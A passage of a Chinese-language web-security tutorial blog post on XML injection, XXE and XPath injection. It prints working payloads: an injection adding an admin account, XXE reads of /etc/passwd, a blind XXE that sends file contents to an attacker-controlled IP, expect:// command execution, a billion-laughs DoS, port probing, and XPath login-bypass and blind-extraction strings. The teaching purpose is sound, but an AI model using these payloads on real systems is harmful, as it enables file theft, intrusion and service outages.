class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br></code></pre></td></tr></table></figure><p>server接收结果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样就通过XML注入添加了一个名为<code>hack</code>，密码为<code>hacker</code>的管理员账户。<br> XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><strong>外部引用</strong>可以支持http，file，ftp等协议<br>如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞<br>攻击者可以构造一个XML文档，文档里引用外部实体通过协议进行读取文件等操作<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">一般实体+外部实体<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br><br>参数实体+外部实体<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [  <br>    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>    %file;<br>]&gt;<br></code></pre></td></tr></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>php中解析xml用的是libxml库</p><p>版本&lt;&#x3D;2.9.0的php中</p><p>simplexml_load_string()函数将正确的XML字符转化为php中的SimpleXMLElement对象</p><p>而&gt;2.9.0的，默认是禁止解析xml外部实体内容的</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>hosts <span class="hljs-comment">#主机名和ip配置文件</span><br><span class="hljs-regexp">/proc/</span>net/arp <span class="hljs-comment">#流量包的信息</span><br><span class="hljs-regexp">/proc/</span>net/tcp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/udp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/dev <span class="hljs-comment">#提供给用户读取或更改网络适配器及统计信息</span><br><span class="hljs-regexp">/proc/</span>net/fib_trie <span class="hljs-comment">#路由缓存</span><br></code></pre></td></tr></table></figure><h3 id="XXE攻击类别及实例"><a href="#XXE攻击类别及实例" class="headerlink" title="XXE攻击类别及实例"></a>XXE攻击类别及实例</h3><ol><li>有回显</li></ol><p>可以用下面的两种方式：</p><ul><li>直接使用外部实体调用<code>file://</code>、<code>php://filter/read=convert.base64-encode/resource=</code>等函数去读取本地文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?</span>xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ul><li>将外部实体引用的 URL 设置到本地服务器，本地构建恶意 dtd 文件，远程注入</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;<br>%file;]&gt;<br>&lt;test&gt;&amp;evil;&lt;/test&gt;<br>    <br>//外部dtd内容   <br>&lt;!ENTITY evil SYSTEM &quot;file:///etc/passwd&quot; &gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>无回显</li></ol><p>Blind XXE外带，建立dtd文件进行远程协议调用文件</p><p>Blind XXE原理</p><p>先在受害机调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</p><p>再调用<code>evil.dtd</code>中的<code>%file</code>。<code>%file</code>获取受害机上面的敏感文件，然后将<code>%file</code>的返回结果传到<code>%send</code>。</p><p>然后受害机调用<code>%send</code>把读取到的数据发送到远程服务器上。</p><p>假设攻击机ip为：<code>192.168.201.128</code></p><p>vps上部署evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.201.128/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt;<br>    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.201.128/evil.dtd&quot;&gt;<br>    %dtd;<br>    %send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(apache日志记录)</p><p>攻击机上：<code>tail -f /var/log/apache2/access.log</code></p><h3 id="特殊协议攻击"><a href="#特殊协议攻击" class="headerlink" title="特殊协议攻击"></a>特殊协议攻击</h3><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>条件：在安装expect扩展的PHP环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h4 id="ddos"><a href="#ddos" class="headerlink" title="ddos"></a>ddos</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;<br>&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;<br>&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;<br>&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;<br>&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;<br>&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;<br>&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;<br>&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;<br>&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></code></pre></td></tr></table></figure><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;<br>]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h2 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>XPath 注入利用 XPath 解析器的松散输入和容错特性，能够在URL、表单或其它信息上附带恶意的XPath 查询代码，以获得高权限信息的访问权，类似于SQL注入。</p><p>注入对象是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> ，<code>parameters/input</code>等</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p>test.xml(用于存储username和password)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;test.xml&#x27;</span>);<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];<br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;ID:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;id;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;Username:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;username;<br>    &#125;<br>&#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>simplexml_load_file</code>，加载xml文件</p><p>正常查询：<code>?name=test1&amp;pwd=test1</code></p><p>server端语句：<code>/root/users/user[username/text()=&#39;test1&#39;and password/text()=&#39;test1&#39;]</code></p><p>注入语句：<code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code></p><p>server语句：<code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;1&#39;]</code></p><h3 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h3><h4 id="一般注入形式"><a href="#一般注入形式" class="headerlink" title="一般注入形式"></a>一般注入形式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//原php代码中的查询语句</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload1：user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload2：&#x27;]|//*|//*[&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27;]|//*|//*[&#x27;&#x27;]&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs PHP">链：/ -&gt; root -&gt; user/user -&gt; username/email/password<br>判断根节点下的节点数<br><span class="hljs-string">&#x27;or count(/)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点数量为1</span><br><span class="hljs-string">&#x27;or count(/*)=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点下只有一个子节点</span><br>判断根节点下节点长度<br><span class="hljs-string">&#x27;or string-length(name(/*[1]))=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>      <span class="hljs-comment">//判断根节点下的节点长度为1</span><br>判断根节点下节点名称<br><span class="hljs-string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span>r<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜根节点下的节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>o<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设根节点下子节点名称为root，判断子节点下的的节点<br><span class="hljs-string">&#x27;or count(/root)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>                  <span class="hljs-comment">//root节点数量为1</span><br><span class="hljs-string">&#x27;or count(/root/user/*)&gt;1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>            <span class="hljs-comment">//root下有两个或以上节点</span><br><span class="hljs-string">&#x27;or string-length(name(/root/*[1]))=4  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//判断第一个子节点长度为4</span><br>猜解root下的节点名称：<br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//猜root节点下的第一个节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设root下节点名称为user<br><span class="hljs-string">&#x27;or count(/root/user)=2  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <span class="hljs-comment">//user节点有两个，则可以猜测出root节点结构，root下两个节点，均为user节点</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>判断user节点的子节点长度<br><span class="hljs-string">&#x27;or string-length(name(/root/user[position()=1]/*[1]))=8 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//user下第一个子节点长名称度为8</span><br>判断user节点的下子节点名称<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜user节点下的第一个节点名称</span><br>...<br>最终所有子节点值验证如下：<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1)=&#x27;</span>username<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[2]), 1)=&#x27;</span>email<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[3]), 1)=&#x27;</span>password<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>猜有无子节点<br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/email/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/accounttype/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/password/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-literal">false</span>则没有节点<br>读最后节点长度<br><span class="hljs-string">&#x27;or string-length((//user[position()=1]/username[position()=1]))=6 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-comment">//第一个user下username长度</span><br>读值<br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>f<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),2,1)=&#x27;</span>l<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),3,1)=&#x27;</span>a<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),4,1)=&#x27;</span>g<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br></code></pre></td></tr></table></figure><p>更多参考</p><p><a href="https://jiang-niao.github.io/2020/04/24/%E4%BB%8Ectf%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E4%B9%A0xpath%E6%B3%A8%E5%85%A5/#CTF%E9%A2%98%E7%9B%AE">xpath盲注脚本</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/01/01/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/01/01/sql%E6%B3%A8%E5%85%A5/</url>
    
